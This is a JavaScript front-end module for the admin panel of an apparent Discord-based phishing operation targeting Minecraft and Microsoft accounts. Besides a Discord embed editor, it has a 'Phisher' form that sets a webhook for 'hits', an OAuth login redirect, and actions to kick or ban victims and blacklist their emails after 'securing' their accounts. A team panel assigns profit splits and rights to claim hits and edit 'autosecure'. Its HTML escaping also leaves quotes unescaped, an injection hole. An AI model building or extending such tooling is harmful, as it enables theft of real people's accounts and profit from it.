        <div class="embed-footer">
          ${this.embedData.footerIcon ? `<img src="${this.embedData.footerIcon}" onerror="this.style.display='none'" style="width:16px;height:16px;border-radius:50%;" />` : ''}
          <span>${this.escapeHtml(this.embedData.footerText)}</span>
        </div>
      ` : ''}
    `;
  },

  escapeHtml(str) {
    if (!str) return '';
    return String(str)
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;');
  },

  formatDiscordMarkdown(text) {
    if (!text) return '';
    let out = this.escapeHtml(text);
    // Code blocks ```code```
    out = out.replace(/```([\s\S]*?)```/g, '<pre style="background:rgba(0,0,0,0.3);padding:6px 8px;border-radius:4px;margin:4px 0;font-family:var(--font-mono);font-size:0.8rem;">$1</pre>');
    // Inline code `code`
    out = out.replace(/`([^`]+)`/g, '<code class="code-badge">$1</code>');
    // Bold **text**
    out = out.replace(/\*\*([^*]+)\*\*/g, '<b>$1</b>');
    // Underline __text__
    out = out.replace(/__([^_]+)__/g, '<u>$1</u>');
    // Links [text](url)
    out = out.replace(/\[([^\]]+)\]\(([^)]+)\)/g, '<a href="$2" target="_blank" style="color:#5865F2;text-decoration:underline;">$1</a>');
    // Newlines
    out = out.replace(/\n/g, '<br>');
    return out;
  },

  async saveEmbedConfig() {
    try {
      this.embedData.title = document.getElementById('emb-title')?.value || '';
      this.embedData.description = document.getElementById('emb-desc')?.value || '';
      this.embedData.color = document.getElementById('emb-color')?.value || '#00ff00';
      this.embedData.authorName = document.getElementById('emb-author-name')?.value || '';
      this.embedData.authorIcon = document.getElementById('emb-author-icon')?.value || '';
      this.embedData.thumbnail = document.getElementById('emb-thumbnail')?.value || '';
      this.embedData.image = document.getElementById('emb-image')?.value || '';
      this.embedData.footerText = document.getElementById('emb-footer-text')?.value || '';
      this.embedData.footerIcon = document.getElementById('emb-footer-icon')?.value || '';

      await API.post('/api/builder/embeds', {
        type: this.selectedType,
        embed: this.embedData
      });

      // Save locally in userCustomEmbeds
      this.userCustomEmbeds[this.selectedType] = JSON.parse(JSON.stringify(this.embedData));

      // Update status badge
      const statusBadge = document.getElementById('emb-status-badge');
      if (statusBadge) {
        statusBadge.className = 'badge-tag success';
        statusBadge.innerHTML = '<i class="fas fa-check-circle"></i> Customized';
      }

      const tplName = this.defaultTemplates[this.selectedType]?.name || this.selectedType;
      Toasts.success(`Saved "${tplName}" configuration!`);
    } catch (err) {
      Toasts.error(err.message);
    }
  },

  async resetToDefault() {
    const tplName = this.defaultTemplates[this.selectedType]?.name || this.selectedType;
    if (!confirm(`Reset "${tplName}" back to the bot's default template? Any custom modifications for this embed will be cleared.`)) {
      return;
    }

    try {
      await API.delete(`/api/builder/embeds?type=${encodeURIComponent(this.selectedType)}`);
      delete this.userCustomEmbeds[this.selectedType];
      this.selectType(this.selectedType);
      Toasts.success(`Reset "${tplName}" to default template`);
    } catch (err) {
      Toasts.error(err.message);
    }
  },

  exportEmbedJson() {
    const json = JSON.stringify(this.embedData, null, 2);
    Modal.open({
      title: `Embed JSON: ${this.defaultTemplates[this.selectedType]?.name || this.selectedType}`,
      bodyHtml: `<pre style="font-family:var(--font-mono);font-size:0.8rem;background:rgba(0,0,0,0.3);padding:14px;border-radius:4px;max-height:300px;overflow-y:auto;">${this.escapeHtml(json)}</pre>`,
      footerHtml: `
        <button class="btn btn-secondary" onclick="API.copyText(\`${json.replace(/`/g, '\\`').replace(/\\/g, '\\\\')}\`, 'JSON')">Copy JSON</button>
        <button class="btn btn-primary" onclick="Modal.close()">Done</button>
      `
    });
  },

  importEmbedJson() {
    const bodyHtml = `
      <div class="form-group">
        <label class="form-label">Paste Embed JSON Object</label>
        <textarea id="import-embed-json-input" class="form-textarea" style="height:220px;font-family:var(--font-mono);font-size:0.8rem;" placeholder='{\n  "title": "My Title",\n  "description": "My Description",\n  "color": "#00ff00"\n}'></textarea>
      </div>
    `;

    Modal.open({
      title: 'Import Embed JSON',
      bodyHtml,
      footerHtml: `
        <button class="btn btn-secondary" onclick="Modal.close()">Cancel</button>
        <button class="btn btn-primary" onclick="BuilderView.submitImportJson()">Apply JSON</button>
      `
    });
  },

  submitImportJson() {
    const raw = document.getElementById('import-embed-json-input')?.value.trim();
    if (!raw) return Toasts.warning('Please paste valid JSON');

    try {
      const parsed = JSON.parse(raw);
      this.embedData = this.normalizeEmbedObject(parsed);
      this.fillFormControls();
      this.renderFieldInputs();
      this.updateLivePreview();
      Modal.close();
      Toasts.success('JSON imported into current editor!');
    } catch (err) {
      Toasts.error('Invalid JSON: ' + err.message);
    }
  },

  async loadPresets() {
    const container = document.getElementById('presets-container');
    if (!container) return;

    try {
      const res = await API.get('/api/builder/presets');
      const presets = res.presets || [];

      if (!presets.length) {
        container.innerHTML = `<div style="text-align:center;padding:40px;color:var(--text-dim);">No presets saved yet.</div>`;
        return;
      }

      container.innerHTML = `
        <div style="display:grid;grid-template-columns:repeat(auto-fit, minmax(260px, 1fr));gap:16px;">
          ${presets.map(p => `
            <div class="card" style="margin-bottom:0;padding:16px;">
              <h4 style="font-size:1rem;font-weight:700;">${this.escapeHtml(p.name)}</h4>
              <p style="font-size:0.75rem;color:var(--text-dim);margin:6px 0 14px;">Saved: ${new Date(p.time).toLocaleDateString()}</p>
              <div style="display:flex;gap:8px;">
                <button class="btn btn-secondary btn-sm" onclick="BuilderView.applyPreset(${p.id})">Load</button>
                <button class="btn btn-danger btn-sm" onclick="BuilderView.deletePreset(${p.id})">Delete</button>
              </div>
            </div>
          `).join('')}
        </div>
      `;
    } catch (err) {
      container.innerHTML = `<div style="color:var(--danger);">${err.message}</div>`;
    }
  },

  async applyPreset(id) {
    try {
      const res = await API.get('/api/builder/presets');
      const preset = (res.presets || []).find(p => p.id === id);
      if (!preset) return Toasts.error('Preset not found');

      let parsed = preset.preset;
      if (typeof parsed === 'string') {
        try { parsed = JSON.parse(parsed); } catch { parsed = {}; }
      }

      this.embedData = this.normalizeEmbedObject(parsed);
      this.switchTab('embeds');
      this.fillFormControls();
      this.renderFieldInputs();
      this.updateLivePreview();
      Toasts.success(`Preset "${preset.name}" loaded into editor!`);
    } catch (err) {
      Toasts.error(err.message);
    }
  },

  openSavePresetModal() {
    const bodyHtml = `
      <div class="form-group">
        <label class="form-label">Preset Name</label>
        <input type="text" id="save-preset-name" class="form-input" placeholder="e.g. Hypixel Verification" required />
      </div>
      <div class="form-group">
        <label class="form-label">Attached Button Label (Optional)</label>
        <input type="text" id="save-preset-btn-label" class="form-input" placeholder="e.g. Verify Account" />
      </div>
      <div class="form-group">
        <label class="form-label">Button Link (Optional)</label>
        <input type="text" id="save-preset-btn-link" class="form-input" placeholder="https://..." />
      </div>
    `;

    Modal.open({
      title: 'Save New Preset',
      bodyHtml,
      footerHtml: `
        <button class="btn btn-secondary" onclick="Modal.close()">Cancel</button>
        <button class="btn btn-primary" onclick="BuilderView.submitSavePreset()">Save Preset</button>
      `
    });
  },

  async submitSavePreset() {
    const name = document.getElementById('save-preset-name').value.trim();
    const buttonlabel = document.getElementById('save-preset-btn-label').value.trim();
    const buttonlink = document.getElementById('save-preset-btn-link').value.trim();

    if (!name) return Toasts.warning('Preset name required');

    try {
      await API.post('/api/builder/presets', {
        name,
        preset: this.embedData,
        buttonlabel,
        buttonlink
      });
      Modal.close();
      Toasts.success('Preset saved!');
      this.loadPresets();
    } catch (err) {
      Toasts.error(err.message);
    }
  },

  async deletePreset(id) {
    if (!confirm('Delete preset?')) return;
    try {
      await API.delete(`/api/builder/presets/${id}`);
      Toasts.success('Preset deleted');
      this.loadPresets();
    } catch (err) {
      Toasts.error(err.message);
    }
  },

  async loadPhisherConfig() {
    const container = document.getElementById('phisher-container');
    if (!container) return;

    try {
      const res = await API.get('/api/builder/phisher');
      const p = res.phisher || {};

      container.innerHTML = `
        <form onsubmit="BuilderView.savePhisher(event)">
          <div class="form-group">
            <label class="form-label">Discord Hits Webhook URL</label>
            <input type="url" id="phisher-webhook" class="form-input" value="${this.escapeHtml(p.webhook || '')}" placeholder="https://discord.com/api/webhooks/..." />
          </div>
          <div class="form-group">
            <label class="form-label">OAuth Redirect Link</label>
            <input type="url" id="phisher-oauth" class="form-input" value="${this.escapeHtml(p.oauth_link || '')}" placeholder="https://login.live.com/oauth20_authorize.srf..." />
          </div>
          <div class="form-group">
            <label class="form-label">Hits Notification Ping</label>
            <input type="text" id="phisher-ping" class="form-input" value="${this.escapeHtml(p.ping || '@everyone')}" placeholder="@everyone or &lt;@&amp;role_id&gt;" />
          </div>
          <div class="form-group">
            <label class="form-label">After-Secure Action</label>
            <select id="phisher-aftersecure" class="form-select">
              <option value="nothing" ${p.aftersecure === 'nothing' ? 'selected' : ''}>Nothing</option>
              <option value="kick" ${p.aftersecure === 'kick' ? 'selected' : ''}>Kick Victim from Server</option>
              <option value="ban" ${p.aftersecure === 'ban' ? 'selected' : ''}>Ban Victim from Server</option>
            </select>
          </div>
          <div style="margin:16px 0;">
            <label class="form-checkbox-label">
              <input type="checkbox" id="phisher-validate" ${p.validateusername ? 'checked' : ''} />
              <span>Validate Minecraft Username Before Securing</span>
            </label>
            <label class="form-checkbox-label">
              <input type="checkbox" id="phisher-blacklist" ${p.blacklistemails ? 'checked' : ''} />
              <span>Blacklist Victim Emails Automatically</span>
            </label>
          </div>
          <button type="submit" class="btn btn-primary"><i class="fas fa-save"></i> Save Phisher Settings</button>
        </form>
      `;
    } catch (err) {
      container.innerHTML = `<div style="color:var(--danger);">${err.message}</div>`;
    }
  },

  async savePhisher(e) {
    e.preventDefault();
    const payload = {
      webhook: document.getElementById('phisher-webhook').value.trim(),
      oauth_link: document.getElementById('phisher-oauth').value.trim(),
      ping: document.getElementById('phisher-ping').value.trim(),
      aftersecure: document.getElementById('phisher-aftersecure').value,
      validateusername: document.getElementById('phisher-validate').checked ? 1 : 0,
      blacklistemails: document.getElementById('phisher-blacklist').checked ? 1 : 0
    };

    try {
      await API.post('/api/builder/phisher', payload);
      Toasts.success('Phisher configuration saved!');
    } catch (err) {
      Toasts.error(err.message);
    }
  },

  async loadSubusers() {
    const container = document.getElementById('subusers-container');
    if (!container) return;

    try {
      const res = await API.get('/api/builder/subusers');
      const list = res.subusers || [];

      if (!list.length) {
        container.innerHTML = `<div style="text-align:center;padding:40px;color:var(--text-dim);">No team members or sub-users configured.</div>`;
        return;
      }

      container.innerHTML = `
        <div class="table-wrapper">
          <table>
            <thead>
              <tr>
                <th>Member Discord ID</th>
                <th>Profit Split</th>
                <th>Claiming</th>
                <th>Bot Access</th>
                <th>Embed Edit</th>
                <th>Action</th>
              </tr>
            </thead>
            <tbody>
              ${list.map(u => `
                <tr>
                  <td><b>${this.escapeHtml(u.child)}</b></td>
                  <td><span class="badge-tag warning">${u.split || 50}%</span></td>
                  <td>${u.claiming ? '✅' : '❌'}</td>
                  <td>${u.editbot ? '✅' : '❌'}</td>
                  <td>${u.editembeds ? '✅' : '❌'}</td>
                  <td>
                    <button class="btn btn-danger btn-sm" onclick="BuilderView.deleteSubuser('${this.escapeHtml(u.child)}')">Remove</button>
                  </td>
                </tr>
              `).join('')}
            </tbody>
          </table>
        </div>
      `;
    } catch (err) {
      container.innerHTML = `<div style="color:var(--danger);">${err.message}</div>`;
    }
  },

  openAddSubuserModal() {
    const bodyHtml = `
      <div class="form-group">
        <label class="form-label">Team Member Discord User ID *</label>
        <input type="text" id="sub-child-id" class="form-input" placeholder="e.g. 123456789012345678" required />
      </div>
      <div class="form-group">
        <label class="form-label">Percentage Split (%)</label>
        <input type="number" id="sub-split" class="form-input" value="50" min="0" max="100" />
      </div>
      <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;">
        <label class="form-checkbox-label">
          <input type="checkbox" id="sub-claiming" checked /> <span>Can Claim Hits</span>
        </label>
        <label class="form-checkbox-label">
          <input type="checkbox" id="sub-editbot" /> <span>Edit Bot Fleet</span>
        </label>
        <label class="form-checkbox-label">
          <input type="checkbox" id="sub-editembeds" /> <span>Edit Embeds</span>
        </label>
        <label class="form-checkbox-label">
          <input type="checkbox" id="sub-editautosecure" /> <span>Edit Autosecure</span>
        </label>
      </div>
    `;

    Modal.open({
      title: 'Add Team Member / Sub-User',
      bodyHtml,
      footerHtml: `
        <button class="btn btn-secondary" onclick="Modal.close()">Cancel</button>
        <button class="btn btn-primary" onclick="BuilderView.submitAddSubuser()">Save Permissions</button>
      `
    });
  },

  async submitAddSubuser() {
    const child = document.getElementById('sub-child-id').value.trim();
    const split = parseInt(document.getElementById('sub-split').value, 10) || 50;
    const claiming = document.getElementById('sub-claiming').checked ? 1 : 0;
    const editbot = document.getElementById('sub-editbot').checked ? 1 : 0;
    const editembeds = document.getElementById('sub-editembeds').checked ? 1 : 0;
    const editautosecure = document.getElementById('sub-editautosecure').checked ? 1 : 0;

    if (!child) return Toasts.warning('Discord ID required');

    try {
      await API.post('/api/builder/subusers', {
        child, split, claiming, editbot, editembeds, editautosecure
      });
      Modal.close();
      Toasts.success('Sub-user saved');
      this.loadSubusers();
    } catch (err) {
      Toasts.error(err.message);
    }
  },

  async deleteSubuser(child) {
    if (!confirm(`Remove sub-user ${child}?`)) return;
    try {
      await API.delete(`/api/builder/subusers/${child}`);
      Toasts.success('Sub-user removed');
      this.loadSubusers();
    } catch (err) {
      Toasts.error(err.message);
    }
  }
};

window.BuilderView = BuilderView;
